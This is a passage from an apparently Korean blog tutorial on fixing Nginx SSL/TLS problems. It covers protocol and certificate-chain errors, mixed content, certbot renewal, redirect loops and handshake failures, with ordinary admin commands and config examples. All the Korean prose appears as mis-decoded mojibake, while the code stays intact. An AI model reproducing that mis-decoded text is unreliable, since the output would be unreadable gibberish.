/etc/ssl/certs/backend-ca.crt;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="íŠ¸ëŸ¬ë¸”ìŠˆíŒ…"><a href="#íŠ¸ëŸ¬ë¸”ìŠˆíŒ…" class="headerlink" title="íŠ¸ëŸ¬ë¸”ìŠˆíŒ…"></a>íŠ¸ëŸ¬ë¸”ìŠˆíŒ…</h2><p>SSL&#x2F;TLS ì„¤ì • ì¤‘ ë°œìƒí•  ìˆ˜ ìˆëŠ” ì¼ë°˜ì ì¸ ë¬¸ì œì™€ í•´ê²° ë°©ë²•ì„ ì†Œê°œí•©ë‹ˆë‹¤.</p><h3 id="1-ERR-SSL-PROTOCOL-ERROR"><a href="#1-ERR-SSL-PROTOCOL-ERROR" class="headerlink" title="1. ERR_SSL_PROTOCOL_ERROR"></a>1. ERR_SSL_PROTOCOL_ERROR</h3><h4 id="ì¦ìƒ"><a href="#ì¦ìƒ" class="headerlink" title="ì¦ìƒ"></a>ì¦ìƒ</h4><p>ë¸Œë¼ìš°ì €ì—ì„œ â€œERR_SSL_PROTOCOL_ERRORâ€ ë˜ëŠ” â€œì´ ì‚¬ì´íŠ¸ì— ì•ˆì „í•˜ê²Œ ì—°ê²°í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤â€ ë©”ì‹œì§€ê°€ í‘œì‹œë©ë‹ˆë‹¤.</p><h4 id="ì›ì¸"><a href="#ì›ì¸" class="headerlink" title="ì›ì¸"></a>ì›ì¸</h4><ol><li><p><strong>Nginx SSL ì„¤ì • ì˜¤ë¥˜</strong></p><ul><li>ì˜ëª»ëœ SSL ì¸ì¦ì„œ ê²½ë¡œ</li><li>ë¬¸ë²• ì˜¤ë¥˜ê°€ ìˆëŠ” ì„¤ì • íŒŒì¼</li><li>ì¶©ëŒí•˜ëŠ” server ë¸”ë¡</li></ul></li><li><p><strong>í¬íŠ¸ 443ì´ ì°¨ë‹¨ë¨</strong></p><ul><li>ë°©í™”ë²½ì´ HTTPS íŠ¸ë˜í”½ì„ ì°¨ë‹¨</li><li>Nginxê°€ í¬íŠ¸ 443ì—ì„œ ë¦¬ìŠ¤ë‹í•˜ì§€ ì•ŠìŒ</li><li>ë‹¤ë¥¸ í”„ë¡œì„¸ìŠ¤ê°€ í¬íŠ¸ 443ì„ ì‚¬ìš© ì¤‘</li></ul></li><li><p><strong>SSL í”„ë¡œí† ì½œ ë¶ˆì¼ì¹˜</strong></p><ul><li>ì˜¤ë˜ëœ TLS ë²„ì „ë§Œ ì§€ì›</li><li>í´ë¼ì´ì–¸íŠ¸ì™€ ì„œë²„ ê°„ ì•”í˜¸í™” ìŠ¤ìœ„íŠ¸ ë¶ˆì¼ì¹˜</li></ul></li></ol><h4 id="í•´ê²°-ë°©ë²•"><a href="#í•´ê²°-ë°©ë²•" class="headerlink" title="í•´ê²° ë°©ë²•"></a>í•´ê²° ë°©ë²•</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. Nginx ì„¤ì • ë¬¸ë²• ê²€ì‚¬</span></span><br><span class="line">sudo nginx -t</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. í¬íŠ¸ 443 ì‚¬ìš© í™•ì¸</span></span><br><span class="line">sudo netstat -tlnp | grep :443</span><br><span class="line"><span class="comment"># ë˜ëŠ”</span></span><br><span class="line">sudo ss -tlnp | grep :443</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. ë°©í™”ë²½ ì„¤ì • í™•ì¸</span></span><br><span class="line">sudo ufw status</span><br><span class="line">sudo ufw allow 443/tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># iptables ì‚¬ìš© ì‹œ</span></span><br><span class="line">sudo iptables -L -n | grep 443</span><br><span class="line">sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. Nginx í”„ë¡œì„¸ìŠ¤ í™•ì¸</span></span><br><span class="line">sudo systemctl status nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. SSL ì„¤ì • í™•ì¸</span></span><br><span class="line">sudo nginx -T | grep -A 10 <span class="string">&quot;ssl_certificate&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. ì—ëŸ¬ ë¡œê·¸ í™•ì¸</span></span><br><span class="line">sudo <span class="built_in">tail</span> -f /var/log/nginx/error.log</span><br></pre></td></tr></table></figure><p><strong>ì„¤ì • ì˜ˆì‹œ:</strong></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;  <span class="comment"># http2 ë¹¼ë¨¹ì§€ ì•Šê¸°</span></span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/example.com/fullchain.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/example.com/privkey.pem;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># TLS 1.2 ì´ìƒë§Œ í—ˆìš©</span></span><br><span class="line">    <span class="attribute">ssl_protocols</span> TLSv1.<span class="number">2</span> TLSv1.<span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-NET-ERR-CERT-AUTHORITY-INVALID"><a href="#2-NET-ERR-CERT-AUTHORITY-INVALID" class="headerlink" title="2. NET::ERR_CERT_AUTHORITY_INVALID"></a>2. NET::ERR_CERT_AUTHORITY_INVALID</h3><h4 id="ì¦ìƒ-1"><a href="#ì¦ìƒ-1" class="headerlink" title="ì¦ìƒ"></a>ì¦ìƒ</h4><p>ë¸Œë¼ìš°ì €ì—ì„œ â€œì¸ì¦ì„œê°€ ì‹ ë¢°í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤â€ ë˜ëŠ” â€œë³´ì•ˆ ì¸ì¦ì„œ ì˜¤ë¥˜â€ ê²½ê³ ê°€ í‘œì‹œë©ë‹ˆë‹¤.</p><h4 id="ì›ì¸-1"><a href="#ì›ì¸-1" class="headerlink" title="ì›ì¸"></a>ì›ì¸</h4><ol><li><p><strong>ìì²´ ì„œëª… ì¸ì¦ì„œ ì‚¬ìš©</strong></p><ul><li>ë¸Œë¼ìš°ì €ê°€ ì¸ì¦ ê¸°ê´€ì„ ì‹ ë¢°í•˜ì§€ ì•ŠìŒ</li><li>í”„ë¡œë•ì…˜ í™˜ê²½ì—ì„œ ê°œë°œìš© ì¸ì¦ì„œ ì‚¬ìš©</li></ul></li><li><p><strong>ì¸ì¦ì„œ ì²´ì¸ ëˆ„ë½</strong></p><ul><li>ì¤‘ê°„ ì¸ì¦ì„œê°€ í¬í•¨ë˜ì§€ ì•ŠìŒ</li><li><code>cert.pem</code> ëŒ€ì‹  <code>fullchain.pem</code>ì„ ì‚¬ìš©í•´ì•¼ í•¨</li></ul></li><li><p><strong>ë§Œë£Œëœ ì¸ì¦ì„œ</strong></p><ul><li>ì¸ì¦ì„œ ìœ íš¨ê¸°ê°„ì´ ì§€ë‚¨</li><li>Letâ€™s Encrypt ìë™ ê°±ì‹  ì‹¤íŒ¨</li></ul></li><li><p><strong>ë„ë©”ì¸ ë¶ˆì¼ì¹˜</strong></p><ul><li>ì¸ì¦ì„œê°€ ë‹¤ë¥¸ ë„ë©”ì¸ìš©</li><li>www í¬í•¨ ì—¬ë¶€ ì°¨ì´</li></ul></li></ol><h4 id="í•´ê²°-ë°©ë²•-1"><a href="#í•´ê²°-ë°©ë²•-1" class="headerlink" title="í•´ê²° ë°©ë²•"></a>í•´ê²° ë°©ë²•</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. ì¸ì¦ì„œ ì •ë³´ í™•ì¸</span></span><br><span class="line">openssl x509 -<span class="keyword">in</span> /etc/letsencrypt/live/example.com/cert.pem -text -noout</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. ë§Œë£Œì¼ í™•ì¸</span></span><br><span class="line">openssl x509 -<span class="keyword">in</span> /etc/letsencrypt/live/example.com/cert.pem -noout -dates</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. ë„ë©”ì¸ í™•ì¸</span></span><br><span class="line">openssl x509 -<span class="keyword">in</span> /etc/letsencrypt/live/example.com/cert.pem -noout -subject -ext subjectAltName</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. ì¸ì¦ì„œ ì²´ì¸ í™•ì¸</span></span><br><span class="line">openssl s_client -connect example.com:443 -showcerts</span><br></pre></td></tr></table></figure><p><strong>ì„¤ì • ìˆ˜ì •:</strong></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># âŒ ì˜ëª»ëœ ì„¤ì •</span></span><br><span class="line"><span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/example.com/cert.pem;</span><br><span class="line"></span><br><span class="line"><span class="comment"># âœ… ì˜¬ë°”ë¥¸ ì„¤ì • (ì²´ì¸ í¬í•¨)</span></span><br><span class="line"><span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/example.com/fullchain.pem;</span><br><span class="line"><span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/example.com/privkey.pem;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì¶”ê°€ ì„¤ì • (OCSP Stapling)</span></span><br><span class="line"><span class="attribute">ssl_trusted_certificate</span> /etc/letsencrypt/live/example.com/chain.pem;</span><br><span class="line"><span class="attribute">ssl_stapling</span> <span class="literal">on</span>;</span><br><span class="line"><span class="attribute">ssl_stapling_verify</span> <span class="literal">on</span>;</span><br></pre></td></tr></table></figure><h3 id="3-Mixed-Content-Warning"><a href="#3-Mixed-Content-Warning" class="headerlink" title="3. Mixed Content Warning"></a>3. Mixed Content Warning</h3><h4 id="ì¦ìƒ-2"><a href="#ì¦ìƒ-2" class="headerlink" title="ì¦ìƒ"></a>ì¦ìƒ</h4><p>HTTPS ì‚¬ì´íŠ¸ê°€ ë¡œë“œë˜ì§€ë§Œ, ë¸Œë¼ìš°ì € ì½˜ì†”ì— â€œMixed Contentâ€ ê²½ê³ ê°€ í‘œì‹œë˜ê³  ì¼ë¶€ ë¦¬ì†ŒìŠ¤(ì´ë¯¸ì§€, CSS, JS)ê°€ ë¡œë“œë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p><h4 id="ì›ì¸-2"><a href="#ì›ì¸-2" class="headerlink" title="ì›ì¸"></a>ì›ì¸</h4><p>HTTPS í˜ì´ì§€ì—ì„œ HTTP í”„ë¡œí† ì½œë¡œ ë¦¬ì†ŒìŠ¤(ì´ë¯¸ì§€, ìŠ¤í¬ë¦½íŠ¸, ìŠ¤íƒ€ì¼ì‹œíŠ¸)ë¥¼ ë¡œë“œí•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤.</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTTPS í˜ì´ì§€ì—ì„œ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://example.com/script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  <span class="comment">&lt;!-- âŒ Mixed Content --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://cdn.example.com/image.jpg&quot;</span>&gt;</span>  <span class="comment">&lt;!-- âŒ Mixed Content --&gt;</span></span><br></pre></td></tr></table></figure><h4 id="í•´ê²°-ë°©ë²•-2"><a href="#í•´ê²°-ë°©ë²•-2" class="headerlink" title="í•´ê²° ë°©ë²•"></a>í•´ê²° ë°©ë²•</h4><p><strong>ë°©ë²• 1: Content Security Policy í—¤ë” (ìë™ ì—…ê·¸ë ˆì´ë“œ)</strong></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># HTTP ë¦¬ì†ŒìŠ¤ë¥¼ ìë™ìœ¼ë¡œ HTTPSë¡œ ì—…ê·¸ë ˆì´ë“œ</span></span><br><span class="line">    <span class="attribute">add_header</span> Content-Security-Policy <span class="string">&quot;upgrade-insecure-requests&quot;</span> always;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ë°©ë²• 2: HTML ì½”ë“œ ìˆ˜ì •</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- í”„ë¡œí† ì½œ ìƒëµ (ìƒëŒ€ í”„ë¡œí† ì½œ) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//example.com/script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ë˜ëŠ” HTTPSë¡œ ëª…ì‹œ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://example.com/script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ë°©ë²• 3: ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œë¡œ ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ í”„ë¡ì‹œ</strong></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ì™¸ë¶€ HTTP ë¦¬ì†ŒìŠ¤ë¥¼ í”„ë¡ì‹œ</span></span><br><span class="line">    <span class="section">location</span> /external/ &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://external-site.com/;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host external-site.com;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-ì¸ì¦ì„œ-ê°±ì‹ -ì‹¤íŒ¨"><a href="#4-ì¸ì¦ì„œ-ê°±ì‹ -ì‹¤íŒ¨" class="headerlink" title="4. ì¸ì¦ì„œ ê°±ì‹  ì‹¤íŒ¨"></a>4. ì¸ì¦ì„œ ê°±ì‹  ì‹¤íŒ¨</h3><h4 id="ì¦ìƒ-3"><a href="#ì¦ìƒ-3" class="headerlink" title="ì¦ìƒ"></a>ì¦ìƒ</h4><p>Letâ€™s Encrypt ì¸ì¦ì„œ ìë™ ê°±ì‹ ì´ ì‹¤íŒ¨í•˜ê³ , <code>certbot renew</code> ëª…ë ¹ì´ ì˜¤ë¥˜ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</p><h4 id="ì›ì¸-3"><a href="#ì›ì¸-3" class="headerlink" title="ì›ì¸"></a>ì›ì¸</h4><ol><li><p><strong>í¬íŠ¸ 80ì´ ì°¨ë‹¨ë¨</strong></p><ul><li>ACME HTTP-01 ì±Œë¦°ì§€ë¥¼ ìœ„í•´ í¬íŠ¸ 80 í•„ìš”</li><li>ë°©í™”ë²½ì´ë‚˜ ë³´ì•ˆ ê·¸ë£¹ì´ í¬íŠ¸ 80 ì°¨ë‹¨</li></ul></li><li><p><strong>ì›¹ ë£¨íŠ¸ ì ‘ê·¼ ë¶ˆê°€</strong></p><ul><li><code>.well-known/acme-challenge</code> ê²½ë¡œ ì ‘ê·¼ ë¶ˆê°€</li><li>Nginx ì„¤ì •ì—ì„œ í•´ë‹¹ ê²½ë¡œë¥¼ ì°¨ë‹¨</li></ul></li><li><p><strong>ë„ë©”ì¸ DNS ë¬¸ì œ</strong></p><ul><li>DNSê°€ ì˜¬ë°”ë¥¸ IPë¥¼ ê°€ë¦¬í‚¤ì§€ ì•ŠìŒ</li><li>DNS ì „íŒŒ ì§€ì—°</li></ul></li><li><p><strong>Rate Limiting</strong></p><ul><li>Letâ€™s Encryptì˜ ë°œê¸‰ ì œí•œ ì´ˆê³¼</li><li>ê°™ì€ ë„ë©”ì¸ì— ë„ˆë¬´ ë§ì€ ìš”ì²­</li></ul></li></ol><h4 id="í•´ê²°-ë°©ë²•-3"><a href="#í•´ê²°-ë°©ë²•-3" class="headerlink" title="í•´ê²° ë°©ë²•"></a>í•´ê²° ë°©ë²•</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. í¬íŠ¸ 80 í™•ì¸ ë° ê°œë°©</span></span><br><span class="line">sudo ufw allow 80/tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. ACME ì±Œë¦°ì§€ ê²½ë¡œ í…ŒìŠ¤íŠ¸</span></span><br><span class="line">curl -I http://example.com/.well-known/acme-challenge/test</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. ìˆ˜ë™ ê°±ì‹  ì‹œë„ (ìƒì„¸ ë¡œê·¸)</span></span><br><span class="line">sudo certbot renew --dry-run --verbose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. ê°•ì œ ê°±ì‹ </span></span><br><span class="line">sudo certbot renew --force-renewal</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. DNS í™•ì¸</span></span><br><span class="line">dig example.com</span><br><span class="line">nslookup example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. Certbot ë¡œê·¸ í™•ì¸</span></span><br><span class="line">sudo <span class="built_in">tail</span> -f /var/log/letsencrypt/letsencrypt.log</span><br></pre></td></tr></table></figure><p><strong>Nginx ì„¤ì • í™•ì¸:</strong></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ACME ì±Œë¦°ì§€ ê²½ë¡œëŠ” ë°˜ë“œì‹œ í—ˆìš©</span></span><br><span class="line">    <span class="section">location</span><span class="regexp"> ^~</span> /.well-known/acme-challenge/ &#123;</span><br><span class="line">        <span class="attribute">root</span> /var/www/html;</span><br><span class="line">        <span class="attribute">allow</span> all;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë‚˜ë¨¸ì§€ëŠ” HTTPSë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸</span></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$server_name</span><span class="variable">$request_uri</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-Too-Many-Redirects-ë¬´í•œ-ë¦¬ë‹¤ì´ë ‰íŠ¸"><a href="#5-Too-Many-Redirects-ë¬´í•œ-ë¦¬ë‹¤ì´ë ‰íŠ¸" class="headerlink" title="5. Too Many Redirects (ë¬´í•œ ë¦¬ë‹¤ì´ë ‰íŠ¸)"></a>5. Too Many Redirects (ë¬´í•œ ë¦¬ë‹¤ì´ë ‰íŠ¸)</h3><h4 id="ì¦ìƒ-4"><a href="#ì¦ìƒ-4" class="headerlink" title="ì¦ìƒ"></a>ì¦ìƒ</h4><p>ë¸Œë¼ìš°ì €ì—ì„œ â€œERR_TOO_MANY_REDIRECTSâ€ ë˜ëŠ” â€œë¦¬ë‹¤ì´ë ‰íŠ¸ê°€ ë„ˆë¬´ ë§ìŠµë‹ˆë‹¤â€ ì˜¤ë¥˜ê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><h4 id="ì›ì¸-4"><a href="#ì›ì¸-4" class="headerlink" title="ì›ì¸"></a>ì›ì¸</h4><ol><li><p><strong>ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ ë¦¬ë‹¤ì´ë ‰íŠ¸ ë£¨í”„</strong></p><ul><li>ë¡œë“œ ë°¸ëŸ°ì„œ&#x2F;CDNì´ HTTPSë¥¼ HTTPë¡œ ë³€í™˜</li><li>Nginxê°€ HTTPë¥¼ ê°ì§€í•˜ê³  ë‹¤ì‹œ HTTPSë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸</li><li>ë¬´í•œ ë£¨í”„ ë°œìƒ</li></ul></li><li><p><strong>ì˜ëª»ëœ ë¦¬ë‹¤ì´ë ‰íŠ¸ ë¡œì§</strong></p><ul><li>HTTPì™€ HTTPS server ë¸”ë¡ì´ ì„œë¡œë¥¼ ë¦¬ë‹¤ì´ë ‰íŠ¸</li></ul></li></ol><h4 id="í•´ê²°-ë°©ë²•-4"><a href="#í•´ê²°-ë°©ë²•-4" class="headerlink" title="í•´ê²° ë°©ë²•"></a>í•´ê²° ë°©ë²•</h4><p><strong>X-Forwarded-Proto í—¤ë” í™•ì¸:</strong></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># X-Forwarded-Protoê°€ httpsë©´ ë¦¬ë‹¤ì´ë ‰íŠ¸ ì•ˆ í•¨</span></span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$http_x_forwarded_proto</span> = <span class="string">&quot;https&quot;</span>) &#123;</span><br><span class="line">        <span class="comment"># ì´ë¯¸ HTTPSì´ë¯€ë¡œ ì •ìƒ ì²˜ë¦¬</span></span><br><span class="line">        <span class="comment"># (ì‹¤ì œë¡œëŠ” 443 í¬íŠ¸ì—ì„œ ì²˜ë¦¬ë˜ì–´ì•¼ í•˜ì§€ë§Œ ì˜ˆì™¸ ì²˜ë¦¬)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># HTTPì¸ ê²½ìš°ì—ë§Œ ë¦¬ë‹¤ì´ë ‰íŠ¸</span></span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$http_x_forwarded_proto</span> != <span class="string">&quot;https&quot;</span>) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$server_name</span><span class="variable">$request_uri</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>CloudFlare&#x2F;AWS ELB ì‚¬ìš© ì‹œ:</strong></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># CloudFlareì˜ ê²½ìš°</span></span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$redirect</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$http_cf_visitor</span> <span class="regexp">~* &quot;https&quot;)</span> &#123;</span><br><span class="line">        <span class="attribute">set</span> <span class="variable">$redirect</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$http_cf_visitor</span> !<span class="regexp">~* &quot;https&quot;)</span> &#123;</span><br><span class="line">        <span class="attribute">set</span> <span class="variable">$redirect</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$redirect</span> = <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$server_name</span><span class="variable">$request_uri</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ë” ê°„ë‹¨í•œ í•´ê²°ì±… (ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ í™˜ê²½):</strong></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 80 í¬íŠ¸ì—ì„œëŠ” ë¦¬ë‹¤ì´ë ‰íŠ¸ ë¡œì§ ì œê±°</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ë¡œë“œ ë°¸ëŸ°ì„œê°€ ì´ë¯¸ HTTPS ì²˜ë¦¬</span></span><br><span class="line">    <span class="comment"># ì¶”ê°€ ë¦¬ë‹¤ì´ë ‰íŠ¸ ë¶ˆí•„ìš”</span></span><br><span class="line">    <span class="attribute">root</span> /var/www/example.com;</span><br><span class="line">    <span class="attribute">index</span> index.html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/example.com/fullchain.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/example.com/privkey.pem;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/example.com;</span><br><span class="line">    <span class="attribute">index</span> index.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-SSL-Handshake-Failed"><a href="#6-SSL-Handshake-Failed" class="headerlink" title="6. SSL Handshake Failed"></a>6. SSL Handshake Failed</h3><h4 id="ì¦ìƒ-5"><a href="#ì¦ìƒ-5" class="headerlink" title="ì¦ìƒ"></a>ì¦ìƒ</h4><p><code>curl</code> ë˜ëŠ” ë¸Œë¼ìš°ì €ì—ì„œ â€œSSL handshake failedâ€ ì˜¤ë¥˜ê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><h4 id="ì›ì¸-5"><a href="#ì›ì¸-5" class="headerlink" title="ì›ì¸"></a>ì›ì¸</h4><ol><li><strong>TLS ë²„ì „ ë¶ˆì¼ì¹˜</strong></li><li><strong>ì•”í˜¸í™” ìŠ¤ìœ„íŠ¸ ë¶ˆì¼ì¹˜</strong></li><li><strong>SNI(Server Name Indication) ë¬¸ì œ</strong></li></ol><h4 id="í•´ê²°-ë°©ë²•-5"><a href="#í•´ê²°-ë°©ë²•-5" class="headerlink" title="í•´ê²° ë°©ë²•"></a>í•´ê²° ë°©ë²•</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. SSL ì—°ê²° í…ŒìŠ¤íŠ¸</span></span><br><span class="line">openssl s_client -connect example.com:443 -servername example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. íŠ¹ì • TLS ë²„ì „ í…ŒìŠ¤íŠ¸</span></span><br><span class="line">openssl s_client -connect example.com:443 -tls1_2</span><br><span class="line">openssl s_client -connect example.com:443 -tls1_3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. ì•”í˜¸í™” ìŠ¤ìœ„íŠ¸ í™•ì¸</span></span><br><span class="line">nmap --script ssl-enum-ciphers -p 443 example.com</span><br></pre></td></tr></table></figure><p><strong>ì„¤ì • ê°œì„ :</strong></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ìµœì‹  TLSë§Œ í—ˆìš©</span></span><br><span class="line">    <span class="attribute">ssl_protocols</span> TLSv1.<span class="number">2</span> TLSv1.<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ì•ˆì „í•œ ì•”í˜¸í™” ìŠ¤ìœ„íŠ¸</span></span><br><span class="line">    <span class="attribute">ssl_ciphers</span> <span class="string">&#x27;ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384&#x27;</span>;</span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># DH íŒŒë¼ë¯¸í„° (2048ë¹„íŠ¸ ì´ìƒ)</span></span><br><span class="line">    <span class="attribute">ssl_dhparam</span> /etc/nginx/dhparam.pem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Docker-í™˜ê²½ì—ì„œ-SSL"><a href="#Docker-í™˜ê²½ì—ì„œ-SSL" class="headerlink" title="Docker í™˜ê²½ì—ì„œ SSL"></a>Docker í™˜ê²½ì—ì„œ SSL</h2><h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span 